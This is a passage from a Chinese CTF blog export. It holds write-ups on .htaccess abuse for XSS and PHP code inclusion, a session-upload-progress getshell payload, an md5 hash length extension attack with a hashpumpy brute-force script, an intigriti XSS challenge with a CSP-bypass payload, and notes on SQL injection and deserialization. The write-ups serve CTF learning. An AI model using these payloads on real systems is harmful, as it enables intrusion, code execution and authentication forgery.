<p>sites-enabled下的000-default.conf</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjw3aF.png" alt="mjw3aF.png"></p>
<p>这个配置的规则意思是首先关闭的php的解析引擎，再对index.php设置特定的规则，同样设置index.php不受htaccess的影响，并且对index.php开启php的解析引擎。</p>
<p>这里是有多个规则同时作用于/var/www下的文件的，后来问了一下出题的师傅，得知docker-php.conf的优先级要更高一些，所以最终生效的是docker-php.conf的配置规则，所以/var/www目录下是受htaccess影响的。</p>
<p>所以之前的那几个疑惑点也就都弄清了</p>
<ul>
<li>php文件只有index.php解析而其他的文件却不解析：是因为php解析引擎关闭，而000-default.conf文件中只对index.php添加了规则使得index.php正常解析。</li>
<li>AddType application/x-httpd-php .txt这类规则无法生效：同样因为php引擎关闭，无法正常解析</li>
</ul>
<h3 id="htaccess拓展"><a href="#htaccess拓展" class="headerlink" title=".htaccess拓展"></a>.htaccess拓展</h3><h4 id="设置-htaccess实现xss攻击"><a href="#设置-htaccess实现xss攻击" class="headerlink" title="设置.htaccess实现xss攻击"></a>设置.htaccess实现xss攻击</h4><p>.htaccess添加内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value highlight.comment <span class="string">'"&gt;&lt;script&gt;alert(1);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjDS29.png" alt="mjDS29.png"></p>
<p>经实验验证以下配置修改都可以实现xss攻击</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mj5DXT.png" alt="mj5DXT.png"></p>
<h4 id="通过htaccess实现文件包含拿到后门"><a href="#通过htaccess实现文件包含拿到后门" class="headerlink" title="通过htaccess实现文件包含拿到后门"></a>通过htaccess实现文件包含拿到后门</h4><h5 id="无对htaccess内容检验时"><a href="#无对htaccess内容检验时" class="headerlink" title="无对htaccess内容检验时"></a>无对htaccess内容检验时</h5><p>在htaccess中添加如下内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>访问任意php文件</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjsA9e.png" alt="mjsA9e.png"></p>
<h5 id="有对htaccess内容检验时"><a href="#有对htaccess内容检验时" class="headerlink" title="有对htaccess内容检验时"></a>有对htaccess内容检验时</h5><p>如对&lt;?进行检验，我们可以通过utf7编码来绕过</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjcHKJ.png" alt="mjcHKJ.png"></p>
<h4 id="通过设置htaccess规则拿到源码"><a href="#通过设置htaccess规则拿到源码" class="headerlink" title="通过设置htaccess规则拿到源码"></a>通过设置htaccess规则拿到源码</h4><p>在htaccess添加规则如下，使得php解析引擎关闭，得到文件源码</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjgHW8.png" alt="mjgHW8.png"></p>
<h3 id="最后的一些思考"><a href="#最后的一些思考" class="headerlink" title="最后的一些思考"></a>最后的一些思考</h3><p>看了一些php.ini的东西，感觉是会有第四种做法的,就尝试了一下(其实和前三种差不多</p>
<p>最后看php.ini的信息的时候随手翻了一下，发现如下四个配置，而且发现都可以通过htaccess控制</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjIr8I.png" alt="mjIr8I.png"></p>
<p>仔细思考了一下，想到了可以<code>POST</code>一个与<code>session.upload_progress.name</code>同名的变量，这个变量对应的值就会被记录到<code>session</code>文件中，那么我们再去包含这个session，那么也可以getshell的这种做法。</p>
<p>但是这道题没设session，看了一会配置信息，发现上面有一个配置是<code>session.auto_start</code>,这个配置的意思相当于自动开启session_start，那么这样就很好办了，首先设置htaccess文件内容如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php_value session.auto_start <span class="number">1</span></span><br><span class="line">php_value session.upload_progress.cleanup <span class="number">0</span></span><br><span class="line">php_value session.upload_progress.enabled <span class="number">1</span></span><br><span class="line">php_value session.save_path <span class="string">"/tmp"</span></span><br><span class="line">php_value auto_prepend_file <span class="string">"/tmp/sess_123"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>对应payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20sessio%5C%0An.auto_start%201%0Aphp_value%20sessio%5C%0An.up%5C%0Aload_progress.cleanup%200%0Aphp_value%20sessio%5C%0An.uplo%5C%0Aad_progress.enabled%201%0Aphp_value%20sessio%5C%0An.save_path%20%22%2Ftmp%22%0Aphp_value%20auto_prepend_fi%5C%0Ale%20%22%2Ftmp%2Fsess_123%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>

<p>第二步通过表单把shell语句加在session文件中</p>
<p>表单如下</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://4b94737b-7d77-493d-b119-6ab89c8ef450.node1.buuoj.cn"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">vaule</span>=<span class="string">"&lt;?php phpinfo(); ?&gt;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file1"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file2"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里用的buuoj这个平台(很好用,推荐一下)，抓包在burp中加一下PHPSESSID</p>
<p><img src="https://s2.ax1x.com/2019/08/31/mvNlGR.png" alt="mvNlGR.png"></p>
<p>这时上一次我们的配置就生效的了，添加PHPSESSID后也就直接被包含了，执行了我们的php代码</p>
<p><img src="https://s2.ax1x.com/2019/08/31/mvNjY9.png" alt="mvNjY9.png"></p>
<p>其实这个解法和前面的原理思路也都是差不多的，只是想记录一下萌新的一些想法。</p>
<p>文章如果不足之处，还请师傅们指出</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.hackdig.com/02/hack-18445.htm" target="_blank" rel="noopener">http://www.hackdig.com/02/hack-18445.htm</a></p>
<p><a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a></p>
<p><a href="https://php.golaravel.com/ini.list.html" target="_blank" rel="noopener">https://php.golaravel.com/ini.list.html</a></p>
<p><a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>hash长度扩展攻击</title>
    <url>/2019/06/01/hash%E9%95%BF%E5%BA%A6%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h3 id="Hash加密原理"><a href="#Hash加密原理" class="headerlink" title="Hash加密原理"></a>Hash加密原理</h3><p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpaoz491j30j60alwhy.jpg" alt=""></p>
<p>补位过程：对于hash加密，首先对要加密的字符串字节数除64，取得余数，如果余数是56的话，那么就在字符串后面加上八个字节大小的长度描述(用’位’来描述字符串字节的大小，例如字符串“abc”，大小为三个字节，24bit，换算为16进制就是<code>0x18</code>，后面跟上7个字节<code>0x00</code>这里具体的补位在后面还会详细说明；如果余数不是56的话，需要先进行补足56字节，第一个填充字节为<code>0x80</code>,十六进制的<code>0x80</code>也就是二进制的10000000，其余字节用<code>0x00</code>去填充，一直填充到56字节，再进行计算字符串的位数，用后面8个字节对字符串的长度进行描述</p>
<p>生成hash值过程：以64字节为一组，能分为多少组，就需要经过多少次”复杂的数学运算”,每次进行复杂的数学计算都会产生新的register值来给下一次复杂的数学运算来调用，再次生成新的register值，再给下一次复杂的数学运算调用…….，而且每个程序的哈希初始值是默认且唯一的，这样就可以保证每一个字符串的哈希值是唯一的，分两种实际情况进行一次叙述，例如字符串abc，不满56，先进行<code>0x80</code>,<code>0x00</code>补足，而后进行8字节字符串描述，这个只能分为一组，所以只进行一次复杂的数学运算，将程序默认初值<code>register0</code>进行一次复杂的数学运算，生成最终的hash值</p>
<h3 id="用winhex复现过程"><a href="#用winhex复现过程" class="headerlink" title="用winhex复现过程"></a>用winhex复现过程</h3><p>这里自己的博客上传本地图片分辨率会出现很大的问题，所以直接从其他师傅的blog上拿了几张图片</p>
<p>对abc的md5数值进行计算，首先这三个字符有一个16进制转化</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpccqcc0j30kp02l742.jpg" alt=""></p>
<p>首先进行56字节补足</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpci4p4nj30lc03umx5.jpg" alt=""></p>
<p>然后进行字节长度描述</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpd4cvw4j30kx03nq2y.jpg" alt=""></p>
<p><strong>这里还需要提一下md5的特殊的储存方式：</strong></p>
<p>md5使用的是小端储存，具体的储存问题讲解，见这篇博客<a href="https://blog.csdn.net/github_35681219/article/details/52743142" target="_blank" rel="noopener">https://blog.csdn.net/github_35681219/article/details/52743142</a>，这篇博客讲述了md5算法的具体实现。这里大概说一下也就是如果这个字节最后转化为byte时的值是<code>**0****x123**</code>，</p>
<p>那么最后八位就是<code>23 01 00 00 00 00 00 00</code>这也就是所谓的小端储存</p>
<h3 id="浅谈计算与覆盖"><a href="#浅谈计算与覆盖" class="headerlink" title="浅谈计算与覆盖"></a>浅谈计算与覆盖</h3><p>首先生成一个初始链变量</p>
<blockquote>
<p>A=0x1314343</p>
<p>B=0x3435323</p>
<p>C=0x4532434</p>
<p>D=0x13142112</p>
</blockquote>
<p>通过四个非线性函数，将A,B,C,D的值也就是四个链条变量的值与字符串进行复杂的数学运算，最终生成新的四个链条变量，覆盖最初的链条变量，这个点也就是hash长度扩展攻击所利用的点。</p>
<p>接下来用几道题目进行一下哈希长度扩展攻击的应用</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"secret.php"</span>;</span><br><span class="line">@$username=(string)$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span><span class="params">($text)</span></span>&#123;</span><br><span class="line"><span class="keyword">global</span> $key;</span><br><span class="line"><span class="keyword">return</span> md5($key.$text);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(enc($username) === $_COOKIE[<span class="string">'verify'</span>])&#123;</span><br><span class="line"><span class="keyword">if</span>(is_numeric(strpos($username, <span class="string">"admin"</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>($flag);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"you are not admin"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">setcookie(<span class="string">"verify"</span>, enc(<span class="string">"guest"</span>), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">setcookie(<span class="string">"len"</span>, strlen($key), time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
</blockquote>
<p>首先对代码进行分析，这里题目会给出len的长度为46，通过这里可以知道$key的长度是46,而且还知道了md5($key.”guest”)的值为<code>78cfc57d983b4a17e55828c001a3e781</code>，这里又是没图的，所以只能口述条件了，通过post的username,必须其中要包含admin，而且<code>enc($username) === $_COOKIE[&#39;verify&#39;])</code>，这里如果直接post，admin的话，因为我们根本不知道第一次的默认register的值也不知道key的值，所以无法通过cookie将构造的md5值传入，所以需要考虑hash长度扩展攻击去覆盖第一个md5值生成一个新的由链变量和字符串经过非线性函数生成的新的md5值，这里还得用图，不然说不清，还得拿图，(得尽快解决一下上传图片分辨率不行的问题了)</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpdxs9a9j30lz03jmx8.jpg" alt=""></p>
<p>$key的长度是46位，所以前面可以用任意的46个字符去填充，之后写入guest，然后去用八个字节去描述长度51字节，最后再八个字节的后面加上admin</p>
<p><img src="https://cdn.sinaimg.cn.52ecy.cn/large/005BYqpgly1g2rpekpoazj30lo04ft8v.jpg" alt=""></p>
<p>最后将前面的无效字符去掉，变成了(因为这里前面有一个$key的链接)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</span><br></pre></td></tr></table></figure>

<p>然而将这个进行urlencode</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">guest%80%00%00%00%00%98%01%00%00%00%00%00%00admin</span><br></pre></td></tr></table></figure>

<p>这个就是要传入的<code>username</code>变量值，然后通过工具<code>hashpump</code></p>
<p><img src="https://i.imgur.com/05WwBNT.png" alt="img"></p>
<p><code>第一行是得到的hash值,即hash(key.guest)</code><br><code>第二行是已知数据,即guest</code><br><code>第三行是总长度</code><br><code>第四行是要添加的数据 写入admin</code>这里不是对应的图，传不了图好难受orz</p>
<p>最终将md5值换入，和username写入</p>
<p>大体思路总结，因为为止$key的值，而且还要在新的变量中包含admin，这样可以用这个哈希长度扩展攻击，去覆盖之前的md5值生成新的md5值，而且满足了包含admin变量的这个条件</p>
<h3 id="md5-salt-value"><a href="#md5-salt-value" class="headerlink" title="md5($salt.$value)"></a>md5($salt.$value)</h3><p><strong>已知$salt长度</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!empty($_COOKIE[“getmein”])) &#123;</span><br><span class="line">if (urldecode($username) &#x3D;&#x3D;&#x3D; “admin” &amp;&amp; urldecode($password) !&#x3D; “admin”) &#123;</span><br><span class="line">if ($COOKIE[“getmein”] &#x3D;&#x3D;&#x3D; md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">echo “Congratulations! You are a registered user.\n”;</span><br><span class="line">die (“The flag is “. $flag);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (“Your cookies don’t match up! STOP HACKING THIS SITE.”);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">die (“You are not an admin! LEAVE.”);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(“sample-hash”, md5($secret . urldecode(“admin” . “admin”)), time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#x2F;&#x2F;secret为15位</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>对于这种题，直接上工具就行，输入第一次进行复杂运算后的md5值，然后补全位数，用第二次生成的Md5值直接进行覆盖，然后把工具生成的md5也提交过去，就好了</p>
<p>未知$salt长度</p>
<p>贴一下代码并且审计一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">$role &#x3D; “guest”;</span><br><span class="line">$salt &#x3D;</span><br><span class="line">if (isset($_COOKIE[“role”])) &#123;</span><br><span class="line">$role &#x3D; unserialize($_COOKIE[“role”]);</span><br><span class="line">$hsh &#x3D; $_COOKIE[“hsh”];</span><br><span class="line">if ($role&#x3D;&#x3D;&#x3D;”admin” &amp;&amp; $hsh &#x3D;&#x3D;&#x3D; md5($salt.strrev($_COOKIE[“role”]))) &#123;</span><br><span class="line">$auth &#x3D; true;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$auth &#x3D; false;</span><br><span class="line">&#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">$s &#x3D; serialize($role);</span><br><span class="line">setcookie(‘role’,$s);</span><br><span class="line">$hsh &#x3D; md5($salt.strrev($s));</span><br><span class="line">setcookie(‘hsh’,$hsh);</span><br><span class="line">&#125;</span><br><span class="line">if ($auth) &#123;</span><br><span class="line">echo “&lt;h3&gt;Welcome Admin. Your flag is</span><br><span class="line">&#125; else &#123;</span><br><span class="line">echo “&lt;h3&gt;Only Admin can see the flag!!&lt;&#x2F;h3&gt;”;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>这里或许唯一大概不同的就是<code>strrev函数</code>，进行一个字符串翻转，大体意思仍然能相同，通过<code>$hsh = md5($salt.strrev($s));</code>我们可以得到第一次经过这个$salt长度进行哈希加密的值，然后同样去和新的第二个新值去进行第二次复杂的数学运算生成新的Md5值覆盖掉之前的md5，而且这里unserilized反序列化存在00截断，也就是说没有翻转过来的字符串前面的形式时<code>s:5:&quot;admin&quot;%00(balabala)</code>进行反序列化后成功构造完毕满足了等于’admin’这个条件，后面将这个字符串翻转过来，成功构造哈希扩展攻击漏洞，生成新的md5值，经过cookie传一下就好，这里我们唯一需要爆破的是$salt的长度，贴下脚本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashpumpy</span><br><span class="line">import urllib</span><br><span class="line">for i in range(0,15):</span><br><span class="line">url&#x3D;’http:&#x2F;&#x2F;web.jarvisoj.com:32778&#x2F;’</span><br><span class="line">m&#x3D;hashpumpy.hashpump(‘3a4727d57463f122833d9e732f94e4e0′,’;\”tseug\”:5:s’,’;\”nimda\”:5:s’,i)</span><br><span class="line">print i</span><br><span class="line">a&#x3D;m[1][::-1]</span><br><span class="line">b&#x3D;m[0]</span><br><span class="line">a1han&#x3D;urllib.quote(a)</span><br><span class="line">cookie&#x3D;&#123;</span><br><span class="line">‘role’:a1han,</span><br><span class="line">‘hsh’:b &#125;</span><br><span class="line">r&#x3D;requests.get(url,cookies&#x3D;cookie)</span><br><span class="line">if ‘welcome’ in r.text:</span><br><span class="line">print r.text</span><br><span class="line">break</span><br></pre></td></tr></table></figure>

<p>这里需要说明一下的是requests会对post和url的内容进行自动编码，而对cookies的内容不会编码，所以我们要手动进行urllib.quote进行编码。</p>
]]></content>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>intigriti Easter XSS challenge</title>
    <url>/2020/05/12/intigriti-Easter-XSS-challenge/</url>
    <content><![CDATA[<p>文章首发于先知</p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>国外的一个xss challenge(规定时间内做出可得一年的Burp Suite正版证书)</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JY7U10.png" alt="JY7U10.png"></p>
<h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>主要的功能逻辑代码为script.js, 如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hash = <span class="built_in">document</span>.location.hash.substr(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(hash)&#123;</span><br><span class="line">  displayReason(hash);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"reasons"</span>).onchange = <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(e.target.value != <span class="string">""</span>)</span><br><span class="line">    displayReason(e.target.value);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">reasonLoaded</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reason = <span class="built_in">document</span>.getElementById(<span class="string">"reason"</span>);</span><br><span class="line">    reason.innerHTML = <span class="built_in">unescape</span>(<span class="keyword">this</span>.responseText);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">displayReason</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="built_in">window</span>.location.hash = reason;</span><br><span class="line">  <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.addEventListener(<span class="string">"load"</span>, reasonLoaded);</span><br><span class="line">  xhr.open(<span class="string">"GET"</span>,<span class="string">`./reasons/<span class="subst">$&#123;reason&#125;</span>.txt`</span>);</span><br><span class="line">  xhr.send();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码逻辑为：</p>
<p>通过触发location.hash的变化来调用displayReason函数，通过ajax请求得到./reasons/${reason}.txt，然后把response的内容返回给id为reason的标签。</p>
<p>首先测试了下直接在URL的锚部分写上xss语句</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtR4Zn.png" alt="JtR4Zn.png"></p>
<p>这里可以看到这个404的页面，在response时不仅对特殊字符进行了编码处理，而且还会将%替换为_，所以直接通过xss语句触发是没戏了。</p>
<p>接下来尝试了一下.htaccess等403页面的触发，看下对应的response内容有没有经过处理</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtfOER.png" alt="JtfOER.png"></p>
<p>可以看到，在403的response中我们的xss语句是完整存在的，那么接下来只需要把这个xss带到我们之前的页面就可以触发xss了</p>
<p>进行尝试</p>
<p>这里需要注意两个地方</p>
<ul>
<li>第一个是默认ajax去请求是下reasons文件夹下，我们如果要请求.htaccess是需要向上跳一级目录的</li>
<li>第二个是我们需要拿到的是访问htaccess得到的response，所以htaccess的参数需要进行二次编码</li>
</ul>
<p>最终访问效果如下：</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtIBZQ.png" alt="JtIBZQ.png"></p>
<p>可以看到img标签成功被解析。</p>
<p>不过此时仍然没法弹窗，因为这个challenge是有csp进行限制的,csp规则如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">default-src &#39;self&#39;;</span><br></pre></td></tr></table></figure>

<p>限制了资源必须来自此站点</p>
<p>那么接下来就开始寻找一些可以当成js来执行的地方，我们可以通过之前的404页面返回的内容来当作我们的js语句，并且通过script标签的src属性进行引入，唯一需要注意的是要进行单引号的闭合</p>
<p>构造语句如下：</p>
<p><a href="https://imgchr.com/i/JtbPAg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/04/22/JtbPAg.png" alt="JtbPAg.png"></a></p>
<p>在控制台执行一下</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtbQN4.png" alt="JtbQN4.png"></p>
<p>成功触发，接下来把这个返回内容作为外部js引入就可以了</p>
<p>不过不能直接在response里面直接返回script标签，因为这里的赋值是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reason.innerHTML &#x3D; unescape(this.responseText);</span><br></pre></td></tr></table></figure>

<p>通过innterHTML产生的script标签并不可以执行</p>
<p>所以这里可以用iframe的srcdoc属性去解决这个问题，payload如下：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span>/<span class="attr">srcdoc</span>=<span class="string">'&lt;script src="x%27-alert(document.domain)-%27"&gt;&lt;/script&gt;'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>将上面的payload二次编码后，放进location.hash</p>
<p>成功触发xss</p>
<p><img src="https://s1.ax1x.com/2020/04/22/JtvIGF.png" alt="JtvIGF.png"></p>
]]></content>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋公益赛web部分</title>
    <url>/2020/02/25/i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bweb%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>跟着打了下比赛，也算稍微找回点状态吧…（还差一道题没做出有点痛苦），本来是想写一篇全部web题的wp的，但是感觉..有些题实在是没有什么写的意义，所以我就写一些这些题中比较有意思的吧。</p>
<h3 id="Babyphp"><a href="#Babyphp" class="headerlink" title="Babyphp"></a>Babyphp</h3><p>emmm 其实这题也没什么好说的，就是反序列化字符逃逸注入对象一下，因为safe函数处理的是序列化后的字符串，这样我们就可以在age字段中注入我们想要的属性内容，并且通过union-&gt;hacker的字符变换，成功把后面多余的字段扔掉，并且在unserialize的时候触发，执行我们的sql语句…pop链的构造也蛮简单，就不说了…</p>
<h3 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h3><p>这题蛮有趣的，找表倒是很快可以得到表的名称，但是查字段内容我耗了很久….，开始有两个思路，一个是找到系统未ban掉的包含字段内容的系统表，但是似乎不太行….，第二个思路，就是重新找一个无列名注入的思路，由于ban掉了union select字符串的组合，所以之前的通过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select 1,2,3 union select * from user</span><br></pre></td></tr></table></figure>

<p>这种方法肯定是不行了</p>
<p>而且通过下发了几个容器之后，发现正则回溯的bypass的洞确实被补掉了，所以当时是想通过join实现一种新的方法的，不过没找到..，之后就在不断翻文章了，最后翻到了国外师傅这种新的无列名注入的手法（膜），详细操作见下图</p>
<p><img src="https://s2.ax1x.com/2020/02/24/38tQFf.png" alt="38tQFf.png"></p>
<p>看到了这种方法后，思考下如果在ban掉 &lt; ,=,&gt;的情况下还能否成功注入，需要注意的是这种是直接两个虚表的数据比较并不能用like或者regexp这种操作符，这种操作符只适合字符串之间的比较</p>
<p>那么 like 和 regexp这种操作符对于这种方法是否还依然适用呢？答案是肯定的，只不过这样就对flag表有要求了，只能是一个字段。</p>
<p>不过一个字段的操作性算蛮高了….也并不需要这种特殊的方法了..直接substr截取字符去比较就可以了</p>
<p>（PS: 由于ORM框架的出现可能注入题更多只能存在于CTF题中，但是感觉人们的这种研究精神还是很棒的，现在的CTF题中注入技巧也算比较成熟了，所以以后见到能带来惊喜的CTF注入题的机会也是越来越少了..更多高质量的比赛中也几乎放弃了注入类型题）</p>
<h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p>这个题应该说是这个比赛中最好的题了（个人感觉，比赛的时候没做出来555</p>
<p>题目源码如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">var</span> app = express();</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">'path'</span>);</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">var</span> pug = <span class="built_in">require</span>(<span class="string">'pug'</span>);</span><br><span class="line"><span class="keyword">var</span> morgan = <span class="built_in">require</span>(<span class="string">'morgan'</span>);</span><br><span class="line"><span class="keyword">const</span> multer = <span class="built_in">require</span>(<span class="string">'multer'</span>);</span><br><span class="line"></span><br><span class="line">app.use(multer(&#123;<span class="attr">dest</span>: <span class="string">'./dist'</span>&#125;).array(<span class="string">'file'</span>));</span><br><span class="line">app.use(morgan(<span class="string">'short'</span>));</span><br><span class="line">app.use(<span class="string">"/uploads"</span>,express.static(path.join(__dirname, <span class="string">'/uploads'</span>)))</span><br><span class="line">app.use(<span class="string">"/template"</span>,express.static(path.join(__dirname, <span class="string">'/template'</span>)))</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> action = req.query.action?req.query.action:<span class="string">"index"</span>;</span><br><span class="line">    <span class="keyword">if</span>( action.includes(<span class="string">"/"</span>) || action.includes(<span class="string">"\\"</span>) )&#123;</span><br><span class="line">        res.send(<span class="string">"Errrrr, You have been Blocked"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    file = path.join(__dirname + <span class="string">'/template/'</span>+ action +<span class="string">'.pug'</span>);</span><br><span class="line">    <span class="keyword">var</span> html = pug.renderFile(file);</span><br><span class="line">    res.send(html);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/file_upload'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> ip = req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">var</span> obj = &#123;</span><br><span class="line">        msg: <span class="string">''</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!ip.includes(<span class="string">'127.0.0.1'</span>)) &#123;</span><br><span class="line">        obj.msg=<span class="string">"only admin's ip can use it"</span></span><br><span class="line">        res.send(<span class="built_in">JSON</span>.stringify(obj));</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fs.readFile(req.files[<span class="number">0</span>].path, <span class="function"><span class="keyword">function</span>(<span class="params">err, data</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(err)&#123;</span><br><span class="line">            obj.msg = <span class="string">'upload 